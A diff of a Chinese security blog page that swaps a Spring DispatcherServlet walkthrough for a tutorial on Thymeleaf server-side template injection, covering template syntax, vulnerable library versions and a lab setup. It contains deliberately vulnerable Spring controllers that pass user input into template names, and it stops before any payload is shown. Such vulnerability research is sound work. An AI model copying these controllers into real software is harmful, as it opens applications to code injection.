@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>DispatcherServlet.doDispatch请求分发详解 | Godown_blog</title>
+  <title>Java Thymeleaf SSTI(本质为SpEL) | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8140.png')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8152.png')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        DispatcherServlet.doDispatch请求分发详解
+        Java Thymeleaf SSTI(本质为SpEL)
       </span>
     </div>
     
@@ -619,206 +619,329 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="DispatcherServlet-doDispatch详解"><a href="#DispatcherServlet-doDispatch详解" class="headerlink" title="DispatcherServlet.doDispatch详解"></a>DispatcherServlet.doDispatch详解</h1><p>今天来分析一下：</p>
-<p>在DispatcherServlet.doDispatch这个至关重要的spring 请求分发函数中</p>
-<p>为什么运行了<code>mappedHandler = DispatcherServlet.getHandler()</code>，又调用<code>getHandlerAdapter(mappedHandler.getHandler())</code>，然后用Adapter.handle去处理请求。这几个Handler究竟负责处理什么？</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323221427872.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323221427872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323221427872"></p>
-<h2 id="doDispatch流程"><a href="#doDispatch流程" class="headerlink" title="doDispatch流程"></a>doDispatch流程</h2><p>以下列代码举个例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>Java ssti，我特么莱辣</p>
+<p>分析一下thymeleaf，velocity，freemarker等的模板注入！这节是Thymeleaf</p>
+<h1 id="Java-Thymeleaf-SSTI"><a href="#Java-Thymeleaf-SSTI" class="headerlink" title="Java Thymeleaf SSTI"></a>Java Thymeleaf SSTI</h1><p>写JavaWeb和SSM的时候，前端页面可能会用JSP写，但是因为之前项目都是war包部署，而SpringBoot都是jar包且内嵌tomcat，所以是不支持解析jsp文件的。</p>
+<p>但是如果是编写纯静态的html就很不方便，那么这时候就需要一个模版引擎类似于Jinja2可以通过表达式帮我们把动态的变量渲染到前端页面，我们只需要写一个template即可。</p>
+<h2 id="Thymeleaf的一些基础"><a href="#Thymeleaf的一些基础" class="headerlink" title="Thymeleaf的一些基础"></a>Thymeleaf的一些基础</h2><p>作为安全人员，不用完全掌握一个组件具体是怎么在开发中使用的，只需要知道一些简单的方法</p>
+<ul>
+<li>代审指纹：如何区分哪些是Thymeleaf的html？</li>
+</ul>
+<p>在<code>Thymeleaf</code>的<code>html</code>中首先要加上下面的标识。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>首先，跟进到第一个getHandler，也就是DispatcherServlet.getHandler()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323222056117"></p>
-<p>这是一个从handlerMappings中取出handler的方法，取出的handler类型为HandlerExecutionChain</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222204986.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222204986.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323222204986"></p>
-<p>handlerMappings内只有两项，分别是RequestMappingHandlerMapping和BeanNameUrlHandlerMapping</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224006723.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224006723.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323224006723"></p>
-<p>跟进到第一次循环，也就是mapping &#x3D; RequestMappingHandlerMapping时，首先调用getHandlerInternal，然后调用getHandlerExecutionChain，挨着看一下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224145941.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224145941.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323224145941"></p>
-<p>可以看到getHandlerInternal完成了lookupHandlerMethod查找方法，也就是<code>TestController#index()</code>了，封装为HandlerMethod后返回</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224408932.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224408932.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323224408932"></p>
-<p>接着跟进getHandlerExecutionChain，先是用HandlerExcutionChain封装handler，然后向这个Chain内添加符合url path的拦截器interceptor</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224718785.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323224718785.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323224718785"></p>
-<p>这里返回的结果是我们熟悉的HandlerExecutionChain封装的<code>TestController#index()</code> handler。注意这个handler一定是HandlerMethod类型</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223009554.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223009554.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323223009554"></p>
-<p>由此可知：HandlerExecutionChain是添加了interceptor的<code>TestController#index()</code></p>
-<p>接着，回到doDispatch，跟进到第二处getHandlerAdapter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323222056117"></p>
-<p>这里mappedHandler.getHandler是上一步获取的<code>TestController#index()</code>  HandlerMethod ，从handlerAdapters中获取了适配该handler的adapter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223310505.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223310505.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323223310505"></p>
-<p>跟进到supports函数内，如果handler是handlerMethod的子类，并且满足supportInternal（恒为true，仅仅测试是否可强转）会返回true。由前文可知，RequestMappingHandlerMapping处理得到的handler一定满足该supports</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223433493.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223433493.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323223433493"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223610161.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223610161.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323223610161"></p>
-<p>而handlerAdapaters内只有RequestMappingHandlerAdapter、HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter三个适配器</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223708498.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323223708498.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323223708498"></p>
-<p>所以一定会取到RequestMappingHandlerAdapter作为HandlerAdapter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225414691.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225414691.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323225414691"></p>
-<p>继续跟进第三处，ha.handle</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323222056117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323222056117"></p>
-<p>跟进到了RequestMappingHandlerAdapter父抽象类AbstractHandlerMethodAdapter.handle，调用了handleInternal</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225604471.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225604471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323225604471"></p>
-<p>跟进到handleInternal，如果开启了session，就验证session调用invokeHandlerMethod去反射调用<code>TestController#index()</code>，如果没开启session就直接调用</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225804255.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323225804255.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323225804255"></p>
-<p>现在算是走完一遍流程</p>
-<p>对doDispatch做个总结</p>
-<p>1、请求首先进入DispatcherServlet， 由DispatcherServlet 从HandlerMappings中匹配对应的Handler，此时只是获取到了对应的Handler，然后拿着这个Handler去寻找对应的适配器，即：HandlerAdapter；</p>
+<h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p><code>Thymeleaf</code>提供了一些内置标签，通过标签来实现特定的功能。</p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>th:id</td>
+<td>替换id</td>
+<td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td>
+</tr>
+<tr>
+<td>th:text</td>
+<td>文本替换</td>
+<td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th:utext</td>
+<td>支持html的文本替换</td>
+<td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th:object</td>
+<td>替换对象</td>
+<td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td>
+</tr>
+<tr>
+<td>th:value</td>
+<td>替换值</td>
+<td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th:each</td>
+<td>迭代</td>
+<td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th:href</td>
+<td>替换超链接</td>
+<td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td>th:src</td>
+<td>替换资源</td>
+<td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td>
+</tr>
+</tbody></table>
+<ul>
+<li><code>@&#123;&#125;</code></li>
+</ul>
+<p>在Thymeleaf中，如果想引入链接比如link，href，src，需要使用<code>@&#123;资源地址&#125;</code>引入资源。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;index.css&#125;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;index.js&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;index.html&#125;&quot;</span>&gt;</span>超链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>$&#123;&#125;</code></li>
+</ul>
+<p>可以通过<code>$&#123;…&#125;</code>在model中取值，如果在<code>Model</code>中存储字符串，则可以通过<code>$&#123;对象名&#125;</code>直接取值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">addindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">  &#123;</span><br><span class="line">     <span class="comment">//数据添加到model中</span></span><br><span class="line">     model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);<span class="comment">//普通字符串</span></span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;&#x27;我的名字是：&#x27;+$&#123;name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>~&#123;&#125;</code></li>
+</ul>
+<p>如下，在&#x2F;WEB-INF&#x2F;templates&#x2F;footer.html定义一个copy的fragment</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;copy&quot;</span>&gt;</span></span><br><span class="line">  <span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在另一template中引用该片段</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">&quot;~&#123;footer :: copy&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>**<del>{templatename::selector}**，会在<code>/WEB-INF/templates/</code>目录下寻找名为<code>templatename</code>的模版中定义的<code>fragment</code>，如上面的&#96;</del>{footer :: copy}&#96;</li>
+<li>**~{templatename}**，引用整个<code>templatename</code>模版文件作为<code>fragment</code></li>
+<li>**~{::selector} 或 ~{this::selector}**，引用来自同一模版文件名为<code>selector</code>的<code>fragmnt</code></li>
+</ol>
+<p>除了在html中运用之外，springboot的Controller注解等的控制器return相当于利用这个语法直接返回资源目录中的xxx.html，而且不用<code>~&#123;&#125;</code>包裹，如下：</p>
+<p>test.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">&quot;unsafe&quot;</span>&gt;</span> <span class="symbol">&amp;copy;</span> unsafe&#x27;s test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Controller中使用unsafe fragment：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/aaa&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> payload;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;aaa?payload&#x3D;test会处理为<code>~&#123;test&#125;</code>，也就是test.html的内容</p>
+<p>或者</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/aaa&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;::unsafe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;aaa?payload&#x3D;test会返回<code>~&#123;test::unsafe&#125;</code></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDEA能启动Java8的springboot项目，服务器url填<a target="_blank" rel="noopener" href="https://start.aliyun.com/">https://start.aliyun.com</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323141830439.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323141830439.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323141830439"></p>
+<p>组件勾上spring Web即可，因为Themeleaf ssti的漏洞版本在springboot很老的版本了，就不勾Thymeleaf，进去后在pom.xml中添加</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.11.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>漏洞版本thymeleaf-spring5 &lt;&#x3D; 3.0.11.RELEASE</li>
+</ul>
+<p>3.0.12，3.0.13可以绕过，3.0.14被彻底修复</p>
+<p>一般来说是从Controller的return值获取对应想要调用的模板名，然后Thymeleaf后续得到了这个模板名回去&#x2F;templates目录下去找相应的.html文件并返回；问题就在于从return到获取到模板名不仅仅是“一一对应”，这个return本身是支持SpEL表达式的，导致templatename可以被控制时存在注入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;::unsafe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>一些吐槽：</p>
+<p>刚开始测，用的spring-boot-starter-thymeleaf 3.0.11，结果一看thymeleaf根本不在漏洞版本内</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323200219934.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323200219934.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323200219934"></p>
+<p>那么下面三个有什么区别？</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.11.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.11.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>第一个是Thymeleaf的核心库，与Spring无关，相应的，不能使用spEL表达式。如果只想在非 <code>Spring</code> 环境下使用 <code>Thymeleaf</code>，可以只引入这个依赖</p>
+<p>第二个是 <code>Thymeleaf</code> 专门为 <code>Spring 5</code> 设计的集成库，提供了 <code>Thymeleaf</code> 和 <code>Spring</code> 的整合支持。支持SpEL，能解析Spring Bean，支持绑定Model和View。<strong>需要配合 <code>thymeleaf</code> 核心库一起使用</strong>，不能单独使用</p>
+<p>第三个是 <code>Spring Boot</code> 提供的 <code>Thymeleaf</code> 启动器，<strong>包含了前面两个依赖</strong>。但是版本并不一定对应！</p>
+<blockquote>
+<p>网上找了个漏洞版本的springboot，然后去maven才找到这个漏洞的依赖，一般遇到springboot&lt;&#x3D;2.5.x可以看下其thymeleaf是否在漏洞版本内。</p>
+</blockquote>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323195812497.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323195812497.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323195812497"></p>
+<p>据我个人追溯，spring-boot-starter-thymeleaf&lt;&#x3D;2.2.12.RELEASE才使用了漏洞依赖，现在几乎也完全绝迹，所以是个仅供学习的漏洞了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323202007144.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250323202007144.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250323202007144"></p>
+</blockquote>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>根据<code>~&#123;templatename::selector&#125;</code>表达式的情况，很明显可以分为两种注入类型</p>
+<ul>
+<li>一个是注入点在templatesname</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam</span> String payload)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;::unsafe&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>一个是注入点在selector：</li>
+</ul>
